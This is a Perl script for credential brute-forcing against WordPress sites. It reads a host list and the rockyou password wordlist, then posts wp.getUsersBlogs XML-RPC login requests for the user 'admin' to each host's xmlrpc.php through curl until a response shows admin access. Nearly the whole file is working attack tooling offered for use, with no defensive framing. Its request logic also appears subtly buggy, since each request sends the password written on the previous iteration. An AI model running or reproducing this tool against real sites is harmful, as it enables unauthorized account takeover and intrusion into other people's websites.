#!/usr/bin/perl -wU

# WP PingBack/apmification attack password Brute Forcer (DIIIIRTY ! )

use 5.010;
use IO::File;
use Data::Dumper;
use Term::ANSIColor;

my @Tab=();
my $Handle = IO::File->new("hosts.txt", "r") || die $!;

print (colored"\n  [+] ",'bold green');
say "Start to send requests...\n";

while (my $Reading = $Handle->getline()) {
	
		chomp($Reading);
		my $Current=$Reading;
		print (colored"[-] ",'yellow');
		say "Requesting $Current";

		my $Handle2 = IO::File->new("/usr/share/wordlists/rockyou.txt", "r") || die $!;
		my @BF=();

		while (my $pass = $Handle2->getline()) {
			chomp($pass);

			@BF='
				<?xml version="1.0" encoding="iso-8859-1"?>
				<methodCall>
				<methodName>wp.getUsersBlogs</methodName>
				<params>
				<param>
				<value>
					<string>admin</string>
				</value>
				</param>
				<param>
				<value>
					<string>'.$pass.'</string>
				</value>
				</param>
				</params>
				</methodCall>
				';
				
			print (colored"\n  [+] ",'bold yellow');
			say "Testing Authentication using: $pass as password...\n";
		
			my $Request='curl --connect-timeout 5 --data @test.txt https://'.$Current.'/xmlrpc.php 2>/dev/null';
			my $ForTab=`$Request`;
			push(@Tab,$ForTab);
			
			print (colored"\n  [+] ",'bold green');
			say "Parsing output to find RPC Pingback response...";
			
			foreach my$Output(@Tab){

				if ($Output=~/isadmin/i){
					say colored"[*] Password $pass found using this payload: $Output !",'bold green';
					unlink("test.txt");
					exit;
				}
				else{
				print (colored"\n  [+] ",'bold yellow');
				say "Authentication failed ($pass); trying next password\n";
				
				foreach my $lol(@BF){
	
					my $output = new IO::File(">test.txt");
					print $output  $lol;
					$output->close;
					}
				}	

			}
		}
}

unlink("test.txt");

CLOSE:
print (colored"\n  [?] ",'bold blue');
say "[-] Hope that you find something...";




=info
test.txt:

	<?xml version="1.0" encoding="iso-8859-1"?>
	<methodCall>
	<methodName>wp.getUsersBlogs</methodName>
	<params>
	<param>
	<value>
		<string>admin</string>
	</value>
	</param>
	<param>
	<value>
		<string>password</string>
	</value>
	</param>
	</params>
	</methodCall>
=cut
